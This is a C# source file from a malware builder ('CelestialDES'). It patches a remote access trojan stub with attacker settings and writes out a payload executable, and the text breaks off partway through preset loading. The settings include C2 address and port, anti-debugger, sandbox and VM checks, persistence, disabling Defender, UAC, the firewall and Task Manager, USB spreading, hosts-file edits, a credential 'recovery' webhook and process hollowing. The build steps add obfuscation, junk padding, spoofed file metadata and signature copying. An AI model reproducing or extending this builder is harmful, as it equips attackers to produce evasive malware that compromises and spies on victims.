using CelestialDES.Helper;
using dnlib.DotNet;
using dnlib.DotNet.Emit;
using dnlib.DotNet.Writer;
using Microsoft.Win32;
using Notifications.Wpf;
using System;
using System.Collections.Generic;
using System.Data;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Forms;
using Vestris.ResourceLib;

namespace CelestialDES.Pages.BuilderPages
{
    /// <summary>
    /// Логика взаимодействия для Final.xaml
    /// </summary>
    public partial class Final : Page
    {
        private List<string> loadedscripts = new List<string>();
        public Final()
        {
            InitializeComponent();
        }

        private static Random random = new Random();
        public static string RandomString(int length)
        {
            const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz";
            return new string(Enumerable.Repeat(chars, length)
              .Select(s => s[random.Next(s.Length)]).ToArray());
        }

        private void JunkSize(ModuleDefMD moduleDefMD, int size)
        {
            if ((size < 1) || (size > 9999999)) return;

            for (int i = 0; i < size; i++)
            {
                var junkatrb = new TypeDefUser(RandomString(50), moduleDefMD.CorLibTypes.Object.TypeDefOrRef);
                moduleDefMD.Types.Add(junkatrb);
            }
        }

        private void WriteSettings(ModuleDefMD asmDef, string AsmName)
        {
            if(Convert.ToBoolean(Setting.isLotl))
            {
                Setting.InstallSubFolder = "-";
                Setting.watchdogfolder = "-";
                Setting.watchdogname = "-";
                Setting.InstallName = "-";
                Setting.RegistryKeyName = "-";
                Setting.NameInTasks = "-";
            }

            try
            {
                foreach (TypeDef type in asmDef.Types)
                {
                    asmDef.Assembly.Name = Path.GetFileNameWithoutExtension(AsmName);
                    asmDef.Name = Path.GetFileName(AsmName);
                    if (type.Name == "Settings")
                        foreach (MethodDef method in type.Methods)
                        {
                            if (method.Body == null) continue;
                            for (int i = 0; i < method.Body.Instructions.Count(); i++)
                            {
                                if (method.Body.Instructions[i].OpCode == OpCodes.Ldstr)
                                {
                                    if (method.Body.Instructions[i].Operand.ToString() == "[%askInstall%]")
                                        method.Body.Instructions[i].Operand = Encryption.Base64Encode(Setting.askInstall);

                                    if (method.Body.Instructions[i].Operand.ToString() == "[%Mutex%]")
                                        method.Body.Instructions[i].Operand = Encryption.Base64Encode(Setting.MutexName);

                                    if (method.Body.Instructions[i].Operand.ToString() == "[%dbgdetect%]")
                                        method.Body.Instructions[i].Operand = Encryption.Base64Encode(Setting.DetectDebugger);

                                    if (method.Body.Instructions[i].Operand.ToString() == "[%sandboxied%]")
                                        method.Body.Instructions[i].Operand = Encryption.Base64Encode(Setting.DetectSandboxie);

                                    if (method.Body.Instructions[i].Operand.ToString() == "[%smallcock%]")
                                        method.Body.Instructions[i].Operand = Encryption.Base64Encode(Setting.DetectSmallDisk);

                                    if (method.Body.Instructions[i].Operand.ToString() == "[%detectmamont%]")
                                        method.Body.Instructions[i].Operand = Encryption.Base64Encode(Setting.DetectXP);

                                    if (method.Body.Instructions[i].Operand.ToString() == "[%needins%]")
                                        method.Body.Instructions[i].Operand = Encryption.Base64Encode(Setting.needInstall);

                                    if (method.Body.Instructions[i].Operand.ToString() == "[%installfolder%]")
                                        method.Body.Instructions[i].Operand = Encryption.Base64Encode(Setting.InstallFolder);

                                    if (method.Body.Instructions[i].Operand.ToString() == "[%installsubfolder%]")
                                        method.Body.Instructions[i].Operand = Encryption.Base64Encode(Setting.InstallSubFolder);

                                    if (method.Body.Instructions[i].Operand.ToString() == "[%installname%]")
                                        method.Body.Instructions[i].Operand = Encryption.Base64Encode(Setting.InstallName);

                                    if (method.Body.Instructions[i].Operand.ToString() == "[%installmelt%]")
                                        method.Body.Instructions[i].Operand = Encryption.Base64Encode(Setting.InstallMelt);

                                    if (method.Body.Instructions[i].Operand.ToString() == "[%runmethod%]")
                                        method.Body.Instructions[i].Operand = Encryption.Base64Encode(Setting.AutoRunMethod);

                                    if (method.Body.Instructions[i].Operand.ToString() == "[%tryanother%]")
                                        method.Body.Instructions[i].Operand = Encryption.Base64Encode(Setting.TryAnotherIfFails);

                                    if (method.Body.Instructions[i].Operand.ToString() == "[%runhidden%]")
                                        method.Body.Instructions[i].Operand = Encryption.Base64Encode(Setting.AutoRunhidden);

                                    if (method.Body.Instructions[i].Operand.ToString() == "[%runhighest%]")
                                        method.Body.Instructions[i].Operand = Encryption.Base64Encode(Setting.AutoRunHighest);

                                    if (method.Body.Instructions[i].Operand.ToString() == "[%regkey%]")
                                        method.Body.Instructions[i].Operand = Encryption.Base64Encode(Setting.RegistryKeyName);

                                    if (method.Body.Instructions[i].Operand.ToString() == "[%nameintask%]")
                                        method.Body.Instructions[i].Operand = Encryption.Base64Encode(Setting.NameInTasks);

                                    if (method.Body.Instructions[i].Operand.ToString() == "[%hideevery%]")
                                        method.Body.Instructions[i].Operand = Encryption.Base64Encode(Setting.HideEverything);

                                    if (method.Body.Instructions[i].Operand.ToString() == "[%hideeverysys%]")
                                        method.Body.Instructions[i].Operand = Encryption.Base64Encode(Setting.HideEverythingSys);

                                    if (method.Body.Instructions[i].Operand.ToString() == "[%dnsip%]")
                                        method.Body.Instructions[i].Operand = Encryption.Base64Encode(Setting.DNS);

                                    if (method.Body.Instructions[i].Operand.ToString() == "[%port%]")
                                        method.Body.Instructions[i].Operand = Encryption.Base64Encode(Setting.Port);

                                    if (method.Body.Instructions[i].Operand.ToString() == "[%clienttag%]")
                                        method.Body.Instructions[i].Operand = Encryption.Base64Encode(Setting.ClientTag);

                                    if (method.Body.Instructions[i].Operand.ToString() == "[%usepastebin%]")
                                        method.Body.Instructions[i].Operand = Encryption.Base64Encode(Setting.UsePastebin);

                                    if (method.Body.Instructions[i].Operand.ToString() == "[%critprocess%]")
                                        method.Body.Instructions[i].Operand = Encryption.Base64Encode(Setting.CritProcess);

                                    if (method.Body.Instructions[i].Operand.ToString() == "[%Watchdog%]")
                                        method.Body.Instructions[i].Operand = Encryption.Base64Encode(Setting.needwatchdog);

                                    if (method.Body.Instructions[i].Operand.ToString() == "[%Watchdogname%]")
                                        method.Body.Instructions[i].Operand = Encryption.Base64Encode(Setting.watchdogname);

                                    if (method.Body.Instructions[i].Operand.ToString() == "[%Watchdogloc%]")
                                        method.Body.Instructions[i].Operand = Encryption.Base64Encode(Setting.watchdogfolder);

                                    if (method.Body.Instructions[i].Operand.ToString() == "[%pasebinlink%]")
                                        method.Body.Instructions[i].Operand = Encryption.Base64Encode(Setting.PastebinLink);

                                    if (method.Body.Instructions[i].Operand.ToString() == "[%needadm%]")
                                        method.Body.Instructions[i].Operand = Encryption.Base64Encode(Convert.ToString(Setting.needadmin));

                                    if (method.Body.Instructions[i].Operand.ToString() == "[%taskmgr%]")
                                        method.Body.Instructions[i].Operand = Encryption.Base64Encode(Setting.DisableTaskMGR);

                                    if (method.Body.Instructions[i].Operand.ToString() == "[%registrytools%]")
                                        method.Body.Instructions[i].Operand = Encryption.Base64Encode(Setting.DisableRegistry);

                                    if (method.Body.Instructions[i].Operand.ToString() == "[%discmd%]") 
                                        method.Body.Instructions[i].Operand = Encryption.Base64Encode(Setting.DisableCMD);

                                    if (method.Body.Instructions[i].Operand.ToString() == "[%uac%]")
                                        method.Body.Instructions[i].Operand = Encryption.Base64Encode(Setting.DisableUAC);

                                    if (method.Body.Instructions[i].Operand.ToString() == "[%firewall%]")
                                        method.Body.Instructions[i].Operand = Encryption.Base64Encode(Setting.DisableFirewall);

                                    if (method.Body.Instructions[i].Operand.ToString() == "[%windef%]")
                                        method.Body.Instructions[i].Operand = Encryption.Base64Encode(Setting.DisableWinDef);

                                    if (method.Body.Instructions[i].Operand.ToString() == "[%usbspr%]")
                                        method.Body.Instructions[i].Operand = Encryption.Base64Encode(Setting.USBSpread);

                                    if (method.Body.Instructions[i].Operand.ToString() == "[%usbsprname%]")
                                        method.Body.Instructions[i].Operand = Encryption.Base64Encode(Setting.USBSpreadn);

                                    if (method.Body.Instructions[i].Operand.ToString() == "[%DetectCountry%]")
                                        method.Body.Instructions[i].Operand = Encryption.Base64Encode(Setting.CBlack);

                                    if (method.Body.Instructions[i].Operand.ToString() == "[%DetectCountrylist%]")  
                                        method.Body.Instructions[i].Operand = Encryption.Base64Encode(Setting.CBlacklist);

                                    if (method.Body.Instructions[i].Operand.ToString() == "[%needrecovery%]")
                                        method.Body.Instructions[i].Operand = Encryption.Base64Encode(Setting.needweb);

                                    if (method.Body.Instructions[i].Operand.ToString() == "[%webhook%]")
                                        method.Body.Instructions[i].Operand = Encryption.Base64Encode(Setting.weburl);

                                    if (method.Body.Instructions[i].Operand.ToString() == "[%chromekill%]")
                                        method.Body.Instructions[i].Operand = Encryption.Base64Encode(Setting.chromekill);

                                    if (method.Body.Instructions[i].Operand.ToString() == "[%HostsEdit%]")
                                        method.Body.Instructions[i].Operand = Encryption.Base64Encode(Setting.HostsEdit);

                                    string towrite = "";

                                    foreach (Hostslist.Host host in Hostslist.hostslist)
                                    {
                                        towrite += host.IP + "|" + host.Domain + ";";
                                    }

                                    if (method.Body.Instructions[i].Operand.ToString() == "[%HostsList%]")
                                        method.Body.Instructions[i].Operand = Encryption.Base64Encode(towrite);

                                    if (method.Body.Instructions[i].Operand.ToString() == "[%LibFolder%]")
                                    {
                                        if(Setting.LibFolder.StartsWith("%")) method.Body.Instructions[i].Operand = Encryption.Base64Encode(Setting.LibFolder);
                                        else method.Body.Instructions[i].Operand = Encryption.Base64Encode("Same");
                                    
                                        if(Convert.ToBoolean(Setting.isLotl) && !Setting.LibFolder.StartsWith("%"))
                                        {
                                            method.Body.Instructions[i].Operand = Encryption.Base64Encode("%appdata%");
                                        }
                                    }

                                    if (method.Body.Instructions[i].Operand.ToString() == "[%LibSubFolder%]")
                                        method.Body.Instructions[i].Operand = Encryption.Base64Encode(Setting.LibSubFolder);

                                    if (method.Body.Instructions[i].Operand.ToString() == "[%detectvirtualization%]")
                                        method.Body.Instructions[i].Operand = Encryption.Base64Encode(Setting.DetectVirtualEnviroment);

                                    if (method.Body.Instructions[i].Operand.ToString() == "[%DisableRun%]")
                                        method.Body.Instructions[i].Operand = Encryption.Base64Encode(Setting.DisableRun);

                                    if (method.Body.Instructions[i].Operand.ToString() == "[%DisableWinKeys%]")
                                        method.Body.Instructions[i].Operand = Encryption.Base64Encode(Setting.DisableWinKeys);

                                    if (method.Body.Instructions[i].Operand.ToString() == "[%isServer%]")
                                        method.Body.Instructions[i].Operand = Encryption.Base64Encode(Setting.needserver);

                                    if (method.Body.Instructions[i].Operand.ToString() == "[%password%]")
                                        method.Body.Instructions[i].Operand = Encryption.Base64Encode(Setting.DecryptionPassword);

                                    if (method.Body.Instructions[i].Operand.ToString() == "[%isLotl%]")
                                        method.Body.Instructions[i].Operand = Encryption.Base64Encode(Setting.isLotl);
                                }
                            }
                        }
                }
            }
            catch { }
        }
        
        private void WriteAssembly(string filename)
        {
            try
            {
                VersionResource versionResource = new VersionResource();
                versionResource.LoadFrom(filename);

                versionResource.FileVersion = Setting.filever;
                versionResource.ProductVersion = Setting.productver;
                versionResource.Language = 0;

                StringFileInfo stringFileInfo = (StringFileInfo)versionResource["StringFileInfo"];
                stringFileInfo["ProductName"] = Setting.product;
                stringFileInfo["FileDescription"] = Setting.description;
                stringFileInfo["CompanyName"] = Setting.company;
                stringFileInfo["LegalCopyright"] = Setting.copyright;
                stringFileInfo["LegalTrademarks"] = Setting.trademarks;
                stringFileInfo["Assembly Version"] = versionResource.ProductVersion;
                stringFileInfo["InternalName"] = Setting.originalfilename;
                stringFileInfo["OriginalFilename"] = Setting.originalfilename;
                stringFileInfo["ProductVersion"] = versionResource.ProductVersion;
                stringFileInfo["FileVersion"] = versionResource.FileVersion;

                versionResource.SaveTo(filename);
            }
            catch { }
        }

        public void writeScripts(ModuleDefMD asmDef)
        {
            if (loadedscripts.Count <= 0) return;

            for(int i = 0; i < loadedscripts.Count; i++)
            {
                asmDef.Resources.Add(new EmbeddedResource("lib" + i, Encryption.Compress(File.ReadAllBytes("scripts\\" + loadedscripts[i] + ".dll")), ManifestResourceAttributes.Public));
            }
        }


        public bool BuildMain(string tosave, bool alternative)
        {
            string randomname = "CelestialC";
            string tmppath = Path.GetTempPath() + randomname + ".exe";
            ModuleDefMD asmDef = null;
            try
            {
                if (!Directory.Exists("data\\payload")) Directory.CreateDirectory("data\\payload");
                status.Text = "Loading assembly in memory";
                string pathtorat, decyptionkey;
                if (alternative) { pathtorat = @"Data/RTS.bin"; decyptionkey = "HoNdaDiOZXMusOr"; }
                else { pathtorat = @"Data/RT.bin"; decyptionkey = "PApAgEyjZz"; }
                //using (asmDef = ModuleDefMD.Load(Encryption.Decompress(Encryption.Encrypt(File.ReadAllBytes(pathtorat), decyptionkey))))
                using (asmDef = ModuleDefMD.Load(pathtorat))
                {
                    if (File.Exists(tmppath))
                        File.Delete(tmppath);
                    status.Text = "patching";
                    WriteSettings(asmDef, tmppath);
                    writeScripts(asmDef);
                    if (metroCheckbox1337.IsChecked == true) JunkSize(asmDef, Convert.ToInt32(junkmodifier.Text));
                    var options = new ModuleWriterOptions(asmDef);
                    options.MetadataOptions.Flags |= MetadataFlags.KeepOldMaxStack;
                    status.Text = "writing to disk";
                    asmDef.Write(tmppath, options);
                    asmDef.Dispose();

                    status.Text = "injecting icon";
                    if (Setting.needicon && !Convert.ToBoolean(Setting.isLotl))
                        IconInjector.InjectIcon(tmppath, Setting.icon);

                    status.Text = "injecting assembly";
                    if(!Convert.ToBoolean(Setting.isLotl)) WriteAssembly(tmppath);

                    if (metroCheckBox3.IsChecked == true && !Convert.ToBoolean(Setting.isLotl))
                    {
                        status.Text = "protecting";

                        string fname = Confuser.Obfuscate(tmppath);
                        File.Delete(tmppath);
                        if (File.Exists("data\\payload\\payload.exe"))
                            File.Delete("data\\payload\\payload.exe");
                        File.Move(fname, "data\\payload\\payload.exe");
                    }
                    else
                    {
                        status.Text = "compressing";
                        if (metroCheckBox5.IsChecked == true && !Convert.ToBoolean(Setting.isLotl))
                        {
                            ProcessStartInfo startInff = new ProcessStartInfo
                            {
                                FileName = System.Windows.Forms.Application.StartupPath + "\\data\\payload\\m.exe",
                                CreateNoWindow = true,
                                WindowStyle = ProcessWindowStyle.Hidden,
                                Arguments = "-m -s \"" + tmppath + "\"",
                            };
                            Process.Start(startInff).WaitForExit();
                        }
                        if (File.Exists("data\\payload\\payload.exe"))
                            File.Delete("data\\payload\\payload.exe");
                        File.Move(tmppath, "data\\payload\\payload.exe");
                    }

                    if (Setting.needsignature && !Convert.ToBoolean(Setting.isLotl))
                    {
                        status.Text = "signing";
                        File.Copy(Setting.signature, "sig.exe", true);
                        File.Copy("data\\payload\\sig.py", "sig.py", true);
                        if (File.Exists("payload.exe"))
                            File.Delete("payload.exe");
                        File.Move("data\\payload\\payload.exe", "payload.exe");

                        using (StreamWriter sw = new StreamWriter("apply.cmd"))
                        {
                            sw.WriteLine("python sig.py -i sig.exe -t payload.exe -o payload_sign.exe");
                        }

                        ProcessStartInfo psi = new ProcessStartInfo();
                        psi.FileName = "apply.cmd";
                        psi.RedirectStandardOutput = false;
                        psi.CreateNoWindow = true;
                        psi.WindowStyle = ProcessWindowStyle.Hidden;

                        Process.Start(psi).WaitForExit();

                        File.Delete("payload.exe");
                        File.Delete("sig.exe");
                        File.Delete("sig.py");
                        File.Delete("apply.cmd");

                        if (File.Exists(tosave))
                            File.Delete(tosave);
                        File.Move("payload_sign.exe", tosave);
                    }
                    else
                    {
                        if (File.Exists(tosave))
                            File.Delete(tosave);
                        File.Move("data\\payload\\payload.exe", tosave);
                    }

                    if (metroCheckBox4.IsChecked == true)
                    {
                        status.Text = "saving settings";
                        SettingsC.SaveSetting("Mutex", Setting.MutexName);
                        SettingsC.SaveSetting("dbgdetect", Setting.DetectDebugger);
                        SettingsC.SaveSetting("sandboxied", Setting.DetectSandboxie);
                        SettingsC.SaveSetting("smallcock", Setting.DetectSmallDisk);
                        SettingsC.SaveSetting("detectmamont", Setting.DetectXP);
                        SettingsC.SaveSetting("needins", Setting.needInstall);
                        SettingsC.SaveSetting("installfolder", Setting.InstallFolder);
                        SettingsC.SaveSetting("installsubfolder", Setting.InstallSubFolder);
                        SettingsC.SaveSetting("installname", Setting.InstallName);
                        SettingsC.SaveSetting("installmelt", Setting.InstallMelt);
                        SettingsC.SaveSetting("runmethod", Setting.AutoRunMethod);
                        SettingsC.SaveSetting("tryanother", Setting.TryAnotherIfFails);
                        SettingsC.SaveSetting("runhidden", Setting.AutoRunhidden);
                        SettingsC.SaveSetting("runhighest", Setting.AutoRunHighest);
                        SettingsC.SaveSetting("regkey", Setting.RegistryKeyName);
                        SettingsC.SaveSetting("nameintask", Setting.NameInTasks);
                        SettingsC.SaveSetting("hideevery", Setting.HideEverything);
                        SettingsC.SaveSetting("hideeverysys", Setting.HideEverythingSys);
                        SettingsC.SaveSetting("dnsip", Setting.DNS);
                        SettingsC.SaveSetting("port", Setting.Port);
                        SettingsC.SaveSetting("clienttag", Setting.ClientTag);
                        SettingsC.SaveSetting("usepastebin", Setting.UsePastebin);
                        SettingsC.SaveSetting("critprocess", Setting.CritProcess);
                        SettingsC.SaveSetting("Watchdog", Setting.needwatchdog);
                        SettingsC.SaveSetting("watchdogname", Setting.watchdogname);
                        SettingsC.SaveSetting("watchdogloc", Setting.watchdogfolder);
                        SettingsC.SaveSetting("plink", Setting.PastebinLink);
                        SettingsC.SaveSetting("nadmin", Convert.ToString(Setting.needadmin));
                        SettingsC.SaveSetting("disabletask", Setting.DisableTaskMGR);
                        SettingsC.SaveSetting("disablereg", Setting.DisableRegistry);
                        SettingsC.SaveSetting("disableuac", Setting.DisableUAC);
                        SettingsC.SaveSetting("disablefirewall", Setting.DisableFirewall);
                        SettingsC.SaveSetting("disablewindef", Setting.DisableWinDef);
                        SettingsC.SaveSetting("disablecmd", Setting.DisableCMD);
                        SettingsC.SaveSetting("USBSpread", Setting.USBSpread);
                        SettingsC.SaveSetting("USBSpreadn", Setting.USBSpreadn);
                        SettingsC.SaveSetting("CBlack", Setting.CBlack);
                        SettingsC.SaveSetting("CBlacklist", Setting.CBlacklist);
                        SettingsC.SaveSetting("needweb", Setting.needweb);
                        SettingsC.SaveSetting("weburl", Setting.weburl);
                        SettingsC.SaveSetting("chromekill", Setting.chromekill);
                        SettingsC.SaveSetting("HostsEdit", Setting.HostsEdit);
                        SettingsC.SaveSetting("DetectVirtual", Setting.DetectVirtualEnviroment);
                        SettingsC.SaveSetting("LibFolder", Setting.LibFolder);
                        SettingsC.SaveSetting("LibSubFolder", Setting.LibSubFolder);
                        SettingsC.SaveSetting("DisableRun", Setting.DisableRun);
                        SettingsC.SaveSetting("DisableWinKeys", Setting.DisableWinKeys);
                        SettingsC.SaveSetting("isServer", Setting.needserver);
                        SettingsC.SaveSetting("password", Setting.DecryptionPassword);
                        SettingsC.SaveSetting("isLotl", Setting.isLotl);
                        SettingsC.SaveSetting("LotlCMD", Setting.LotlCMD);
                        SettingsC.SaveSetting("Lotlfilename", Setting.Lotlfilename);
                        SettingsC.SaveSetting("LotlHollowedProcess", Setting.LotlHollowedProcess);

                        string towrite = "";

                        foreach (Hostslist.Host host in Hostslist.hostslist)
                        {
                            towrite += host.IP + "|" + host.Domain + ";";
                        }

                        SettingsC.SaveSetting("HostsList", towrite);

                    }

                    status.Text = "Build success";
                    return true;
                }
            }
            catch (Exception ex) { status.Text = ex.Message; return false; }
        }

        static string sha256(string randomString)
        {
            var crypt = new SHA256Managed();
            string hash = String.Empty;
            byte[] crypto = crypt.ComputeHash(Encoding.ASCII.GetBytes(randomString));
            foreach (byte theByte in crypto)
            {
                hash += theByte.ToString("x2");
            }
            return hash;
        }

        public bool BuildLotl(string tosave)
        {
            try
            {
                status.Text = "patching first module";
                byte[] patchedexe;
                using (var module = ModuleDefMD.Load(Encryption.Decompress(Encryption.Encrypt(File.ReadAllBytes(@"data/stub.bin"), "paSsGeyJZ"))))
                {
                    int seed = Environment.TickCount;
                    var randomizer = new Random();
                    var final =
                        sha256(seed.ToString()).Select(x => randomizer.Next() % 2 == 0 ?
                        (char.IsUpper(x) ? x.ToString().ToLower().First() : x.ToString().ToUpper().First()) : x);
                    var randomUpperLower = new string(final.ToArray());
                    foreach (var type in module.GetTypes())
                    {
                        if (type.Name == "<PrivateImplementationDetails>")
                            foreach (FieldDef field in type.Fields)
                            {
                                if (field.Name == "A4ABEDD1BBAE527EE3918BB23B0655CDAE4BC9688F8928A24A19E81F29587108")
                                    if (field.HasFieldRVA && field.InitialValue != null)
                                    {
                                        byte[] dcoded = File.ReadAllBytes(@"Data\R.bin");
                                        byte[] fake = Encryption.Encrypt(Encryption.Compress(dcoded), randomUpperLower);
                                        Array.Resize(ref fake, (int)field.GetFieldSize());
                                        field.InitialValue = fake;
                                        File.Delete(@"Data\R.bin");
                                    }
                            }
                        if (type.Name == "settings")
                            foreach (MethodDef method in type.Methods)
                            {
                                if (method.Body == null) continue;
                                for (int i = 0; i < method.Body.Instructions.Count(); i++)
                                {
                                    if (method.Body.Instructions[i].OpCode == OpCodes.Ldstr)
                                    {
                                        if (method.Body.Instructions[i].Operand.ToString() == "[%fname%]")
                                            method.Body.Instructions[i].Operand = Setting.Lotlfilename;
                                        if (method.Body.Instructions[i].Operand.ToString() == "[%cmdline%]")
                                            method.Body.Instructions[i].Operand = Setting.LotlCMD;
                                        if (method.Body.Instructions[i].Operand.ToString() == "[%pprocess%]")
                                            method.Body.Instructions[i].Operand = Setting.LotlHollowedProcess;
                                        if (method.Body.Instructions[i].Operand.ToString() == "[%dkey%]")
                                            method.Body.Instructions[i].Operand = randomUpperLower;
                                    }
                                }
                            }

                    }
                    var options = new ModuleWriterOptions(module);
                    options.MetadataOptions.Flags |= MetadataFlags.KeepOldMaxStack;
                    module.Write("patched.bin", options);
                    module.Dispose();
                    patchedexe = File.ReadAllBytes("patched.bin");
                    File.Delete("patched.bin");
                }

                status.Text = "Patching secound module";
                using (var module = ModuleDefMD.Load(Encryption.Decompress(Encryption.Encrypt(File.ReadAllBytes(@"data/injector.bin"), "paSsGeyJZ"))))
                {
                    int seed = Environment.TickCount;
                    var randomizer = new Random();
                    var final =
                        sha256(seed.ToString()).Select(x => randomizer.Next() % 2 == 0 ?
                        (char.IsUpper(x) ? x.ToString().ToLower().First() : x.ToString().ToUpper().First()) : x);
                    var randomUpperLower = new string(final.ToArray());
                    foreach (var type in module.GetTypes())
                    {
                        if (type.Name == "<PrivateImplementationDetails>")
                            foreach (FieldDef field in type.Fields)
                            {
                                if (field.Name == "FA46B5EC2516CF41E8A4FD03138EFA6B3481EB5FBE640865E99B806A010B3F0C")
                                    if (field.HasFieldRVA && field.InitialValue != null)
                                    {
                                        byte[] fake = Encryption.Encrypt(Encryption.Compress(patchedexe), randomUpperLower);
                                        Array.Resize(ref fake, (int)field.GetFieldSize());
                                        field.InitialValue = fake;
                                    }
                            }
                        if (type.Name == "settings")
                            foreach (MethodDef method in type.Methods)
                            {
                                if (method.Body == null) continue;
                                for (int i = 0; i < method.Body.Instructions.Count(); i++)
                                {
                                    if (method.Body.Instructions[i].OpCode == OpCodes.Ldstr)
                                    {
                                        if (method.Body.Instructions[i].Operand.ToString() == "[%needmelt%]")
                                            method.Body.Instructions[i].Operand = Setting.InstallMelt;
                                        if (method.Body.Instructions[i].Operand.ToString() == "[%mutex%]")
                                            method.Body.Instructions[i].Operand = Setting.MutexName;
                                        if (method.Body.Instructions[i].Operand.ToString() == "[%dkey%]")
                                            method.Body.Instructions[i].Operand = randomUpperLower;
                                        if (method.Body.Instructions[i].Operand.ToString() == "[%detectvirt%]")
                                            method.Body.Instructions[i].Operand = Setting.DetectVirtualEnviroment;
                                        if (method.Body.Instructions[i].Operand.ToString() == "[%detectsmalldisk%]")
                                            method.Body.Instructions[i].Operand = Setting.DetectSmallDisk;
                                        if (method.Body.Instructions[i].Operand.ToString() == "[%DetectDebugger%]")
                                            method.Body.Instructions[i].Operand = Setting.DetectDebugger;
                                        if (method.Body.Instructions[i].Operand.ToString() == "[%DetectSandboxie%]")
                                            method.Body.Instructions[i].Operand = Setting.DetectSandboxie;
                                    }
                                }
                            }
                    }
                    var options = new ModuleWriterOptions(module);
                    options.MetadataOptions.Flags |= MetadataFlags.KeepOldMaxStack;
                    module.Name = sha256(Environment.TickCount.ToString());
                    module.Assembly.Name = sha256(Environment.TickCount.ToString());

                    string tmppath = Path.GetTempPath() + "finalresult" + ".exe";

                    module.Write(tmppath, options);
                    module.Dispose();
                    if (Setting.needicon) IconInjector.InjectIcon(tmppath, Setting.icon);
                    WriteAssembly(tmppath);
                    if (metroCheckBox3.IsChecked == true)
                    {
                        string fname = Confuser.Obfuscate(tmppath);
                        File.Move(fname, tosave);
                        File.Delete(tmppath);
                    }
                    else File.Move(tmppath, tosave);
                    status.Text = "Build success";
                    return true;
                }
            }
            catch (Exception ex) { status.Text = ex.Message; return false; }
        }

        public void Build_Click(object sender, RoutedEventArgs e)
        {
            System.Windows.Forms.SaveFileDialog saveFileDialog1 = new System.Windows.Forms.SaveFileDialog();
            saveFileDialog1.Filter = ".exe (*.exe)|*.exe";
            saveFileDialog1.InitialDirectory = System.Windows.Forms.Application.StartupPath;
            saveFileDialog1.OverwritePrompt = false;
            saveFileDialog1.FileName = "Build";
            if (saveFileDialog1.ShowDialog() == DialogResult.OK) { } else return;

            if(File.Exists(saveFileDialog1.FileName)) File.Delete(saveFileDialog1.FileName);

            if (!Convert.ToBoolean(Setting.isLotl))
            {
                if (BuildMain(saveFileDialog1.FileName, false))
                {
                    var notificationManager = new NotificationManager();
                    notificationManager.Show(new NotificationContent
                    {
                        Title = "Builder",
                        Message = "Stub file saved to " + saveFileDialog1.FileName,
                        Type = NotificationType.Success
                    });
                }
            }
            else
            {
                if (BuildMain(@"Data\R.bin", true))
                {
                    if (BuildLotl(saveFileDialog1.FileName))
                    {
                        var notificationManager = new NotificationManager();
                        notificationManager.Show(new NotificationContent
                        {
                            Title = "Builder",
                            Message = "Stub file saved to " + saveFileDialog1.FileName,
                            Type = NotificationType.Success
                        });
                    }
                }
            }
            GC.Collect();
        }

        public void LoadPreset_Click(object sender, RoutedEventArgs e)
        {
            var notificationManager = new NotificationManager();
            try
            {
                if (SettingsC.readSetting("clienttag") != "null") Setting.ClientTag = SettingsC.readSetting("clienttag");
                if (SettingsC.readSetting("critprocess") != "null") Setting.CritProcess = SettingsC.readSetting("critprocess");
                if (SettingsC.readSetting("dbgdetect") != "null") Setting.DetectDebugger = SettingsC.readSetting("dbgdetect");
                if (SettingsC.readSetting("detectmamont") != "null") Setting.DetectXP = SettingsC.readSetting("detectmamont");
                if (SettingsC.readSetting("dnsip") != "null") Setting.DNS = SettingsC.readSetting("dnsip");
                if (SettingsC.readSetting("hideevery") != "null") Setting.HideEverything = SettingsC.readSetting("hideevery");
                if (SettingsC.readSetting("hideeverysys") != "null") Setting.HideEverythingSys = SettingsC.readSetting("hideeverysys");
                if (SettingsC.readSetting("installfolder") != "null") Setting.InstallFolder = SettingsC.readSetting("installfolder");
                if (SettingsC.readSetting("installmelt") != "null") Setting.InstallMelt = SettingsC.readSetting("installmelt");
                if (SettingsC.readSetting("installname") != "null") Setting.InstallName = SettingsC.readSetting("installname");
                if (SettingsC.readSetting("installsubfolder") != "null") Setting.InstallSubFolder = SettingsC.readSetting("installsubfolder");
                if (SettingsC.readSetting("Mutex") != "null") Setting.MutexName = SettingsC.readSetting("Mutex");
                if (SettingsC.readSetting("nameintask") != "null") Setting.NameInTasks = SettingsC.readSetting("nameintask");
                if (SettingsC.readSetting("needins") != "null") Setting.needInstall = SettingsC.readSetting("needins");
                if (SettingsC.readSetting("plink") != "null") Setting.PastebinLink = SettingsC.readSetting("plink");
                if (SettingsC.readSetting("port") != "null") Setting.Port = SettingsC.readSetting("port");
                if (SettingsC.readSetting("regkey") != "null") Setting.RegistryKeyName = SettingsC.readSetting("regkey");
                if (SettingsC.readSetting("runhidden") != "null") Setting.AutoRunhidden = SettingsC.readSetting("runhidden");
                if (SettingsC.readSetting("runhighest") != "null") Setting.AutoRunHighest = SettingsC.readSetting("runhighest");
                if (SettingsC.readSetting("runmethod") != "null") Setting.AutoRunMethod = SettingsC.readSetting("runmethod");
                if (SettingsC.readSetting("sandboxied") != "null") Setting.DetectSandboxie = SettingsC.readSetting("sandboxied");
                if (SettingsC.readSetting("smallcock") != "null") Setting.DetectSmallDisk = SettingsC.readSetting("smallcock");
                if (SettingsC.readSetting("tryanother") != "null") Setting.TryAnotherIfFails = SettingsC.readSetting("tryanother");
                if (SettingsC.readSetting("usepastebin") != "null") Setting.UsePastebin = SettingsC.readSetting("usepastebin");
                if (SettingsC.readSetting("Watchdog") != "null") Setting.needwatchdog = SettingsC.readSetting("Watchdog");
                if (SettingsC.readSetting("watchdogloc") != "null") Setting.watchdogfolder = SettingsC.readSetting("watchdogloc");
                if (SettingsC.readSetting("watchdogname") != "null") Setting.watchdogname = SettingsC.readSetting("watchdogname");
                if (SettingsC.readSetting("plink") != "null") Setting.PastebinLink = SettingsC.readSetting("plink");
                if (SettingsC.readSetting("disabletask") != "null") Setting.DisableTaskMGR = SettingsC.readSetting("disabletask");
                if (SettingsC.readSetting("disablereg") != "null") Setting.DisableRegistry = SettingsC.readSetting("disablereg");
                if (SettingsC.readSetting("disableuac") != "null") Setting.DisableUAC = SettingsC.readSetting("disableuac");
                if (SettingsC.readSetting("disablefirewall") != "null") Setting.DisableFirewall = SettingsC.readSetting("disablefirewall");
                if (SettingsC.readSetting("disablewindef") != "null") Setting.DisableWinDef = SettingsC.readSetting("disablewindef");
                if (SettingsC.readSetting("disablecmd") != "null") Setting.DisableCMD = SettingsC.readSetting("disablecmd");
